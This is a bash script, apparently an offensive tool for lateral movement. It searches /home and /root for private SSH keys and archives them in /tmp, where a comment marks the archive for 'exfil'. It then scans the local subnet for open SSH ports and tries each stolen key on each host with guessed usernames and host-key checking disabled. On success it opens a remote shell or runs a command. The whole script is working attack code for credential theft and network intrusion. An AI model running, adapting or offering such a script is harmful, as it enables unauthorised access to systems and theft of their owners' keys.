#!/usr/bin/env bash
set -Eeuo pipefail
IFS=$'\n\t'

##############################################################################
# Configuration ­– tweak if you like
##############################################################################
KEY_DIRS=("/home" "/root")       # search roots for keys
PORTS=(22)                       # ports to scan; add 2222 etc. if needed
SSH_USER_GUESSES=(root ubuntu ec2-user)  # fallbacks if username isn’t encoded in key path
COMMAND_TO_RUN=                  # e.g. "whoami"; leave blank for full shell
SCREEN_SESSION=ssh_hop
SCAN_TIMEOUT=2                   # seconds nc waits on each host:port
KEY_FIND_TIMEOUT=40              # overall limit for grep search

##############################################################################
# Helpers
##############################################################################
log() { printf '[%s] %s\n' "$(date -Is)" "$*"; }

ip2int() { local IFS=.; read -r a b c d <<<"$1"; echo $(((a<<24)|(b<<16)|(c<<8)|d)); }
int2ip() { printf '%d.%d.%d.%d\n' "$((($1>>24)&255))" "$((($1>>16)&255))" "$((($1>>8)&255))" "$(($1&255))"; }

scan_port() {                     # $1=ip $2=port
  if command -v nc &>/dev/null; then
    nc -z -w "$SCAN_TIMEOUT" "$1" "$2" &>/dev/null
  else
    (exec 3<>/dev/tcp/"$1"/"$2") &>/dev/null
  fi
}

##############################################################################
# 1. Discover readable private keys
##############################################################################
log "🔍  Discovering private keys (timeout ${KEY_FIND_TIMEOUT}s)..."
mapfile -t KEY_FILES < <(
  timeout "$KEY_FIND_TIMEOUT" grep -rl --exclude='*.pub' \
    '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' "${KEY_DIRS[@]}" 2>/dev/null || true
)

if ((${#KEY_FILES[@]}==0)); then
  log "❌  No private keys found – aborting."
  exit 1
fi
log "✅  Found ${#KEY_FILES[@]} key(s):"
printf '  %s\n' "${KEY_FILES[@]}"

# Optional archive for exfil/testing
tar -czf /tmp/ssh_keys.tgz --transform='s#^/#keys/#' "${KEY_FILES[@]}" 2>/dev/null || true

##############################################################################
# 2. Scan the local subnet for open SSH ports
##############################################################################
CIDR=$(ip -o -f inet addr show | awk '/scope global/ {print $4; exit}')
IP=${CIDR%%/*}
PREFIX=${CIDR##*/}
MASK=$(( (0xFFFFFFFF << (32-PREFIX)) & 0xFFFFFFFF ))
NET_INT=$(( $(ip2int "$IP") & MASK ))
HOSTS=$(( 1 << (32-PREFIX) ))

log "🌐  Scanning subnet $CIDR for TCP/${PORTS[*]}..."
declare -a OPEN_HOSTS=()
for ((off=1; off<HOSTS-1; off++)); do   # skip network .0 and broadcast
  tgt=$(int2ip $((NET_INT+off)))
  for p in "${PORTS[@]}"; do
    log "🔎  Scanning $tgt:$p..."
    if scan_port "$tgt" "$p"; then
      OPEN_HOSTS+=("$tgt")
      log "  ➜ $tgt:$p open"
      break        # no need to try other ports on same host
    fi
  done
done

if ((${#OPEN_HOSTS[@]}==0)); then
  log "❌  No hosts with SSH open – aborting."
  exit 1
fi
log "✅  Found ${#OPEN_HOSTS[@]} host(s) with SSH open."

##############################################################################
# 3. Attempt SSH with each key ↦ host until success
##############################################################################
attempt_login() {                # $1=host $2=key $3=username
  ssh -i "$2" -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no \
      "$3@$1" exit &>/dev/null
}

for host in "${OPEN_HOSTS[@]}"; do
  for key in "${KEY_FILES[@]}"; do
    # crude username guess based on key path; fallbacks in list
    user_guess=${key##*/}           # filename
    user_guess=${user_guess%%_*}    # e.g. id_rsa_ec2-user -> id
    for user in "$user_guess" "${SSH_USER_GUESSES[@]}"; do
      log "🔑  Trying $key → $user@$host ..."
      if attempt_login "$host" "$key" "$user"; then
        log "🎉  SUCCESS using $key → $user@$host"

        if [[ -n $COMMAND_TO_RUN ]]; then
          ssh -i "$key" -o StrictHostKeyChecking=no "$user@$host" "$COMMAND_TO_RUN"
          exit 0
        else
          log "📺  Dropping into interactive screen session '$SCREEN_SESSION'..."
          screen -dmS "$SCREEN_SESSION" \
                 ssh -i "$key" -o StrictHostKeyChecking=no "$user@$host"
          screen -r "$SCREEN_SESSION"
          exit 0
        fi
      fi
    done
  done
done

log "❌  Exhausted all key/host combinations without success."
exit 1